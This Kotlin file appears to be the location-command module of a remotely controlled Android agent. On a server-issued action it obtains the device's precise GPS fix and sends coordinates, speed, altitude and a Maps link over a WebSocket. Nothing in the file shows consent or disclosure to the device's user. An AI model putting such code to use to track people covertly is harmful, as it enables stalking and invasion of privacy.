package com.sentrix.agent.commands

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.os.Looper
import com.google.android.gms.location.*
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONObject
import kotlin.coroutines.resume

object LocationCommands {
    private const val TIMEOUT = 20_000L

    @SuppressLint("MissingPermission")
    suspend fun getLocation(ctx: Context, ws: WebSocketClient, action: String): String {
        val client = LocationServices.getFusedLocationProviderClient(ctx)
        val last   = getLastKnown(client)
        val loc    = last ?: withTimeoutOrNull(TIMEOUT) { getFresh(client) }
        if (loc != null) {
            ws.send(buildLocationJson(action, loc))
            return "Location sent"
        }
        ws.send(JSONObject().apply {
            put("type", "result"); put("action", action)
            put("success", false); put("error", "Could not get location fix")
        })
        return "Location fix failed"
    }

    @SuppressLint("MissingPermission")
    private suspend fun getLastKnown(client: FusedLocationProviderClient): Location? =
        suspendCancellableCoroutine { cont ->
            client.lastLocation
                .addOnSuccessListener { cont.resume(it) }
                .addOnFailureListener { cont.resume(null) }
        }

    @SuppressLint("MissingPermission")
    private suspend fun getFresh(client: FusedLocationProviderClient): Location? =
        suspendCancellableCoroutine { cont ->
            val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMaxUpdates(1).build()
            val cb = object : LocationCallback() {
                override fun onLocationResult(r: LocationResult) {
                    client.removeLocationUpdates(this)
                    cont.resume(r.lastLocation)
                }
            }
            client.requestLocationUpdates(req, cb, Looper.getMainLooper())
            cont.invokeOnCancellation { client.removeLocationUpdates(cb) }
        }

    private fun buildLocationJson(action: String, loc: Location) = JSONObject().apply {
        put("type",      "result")
        put("action",    action)
        put("success",   true)
        put("latitude",  loc.latitude)
        put("longitude", loc.longitude)
        put("accuracy",  loc.accuracy)
        put("altitude",  loc.altitude)
        put("speed",     loc.speed)
        put("timestamp", loc.time)
        put("mapsUrl",   "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
    }
}
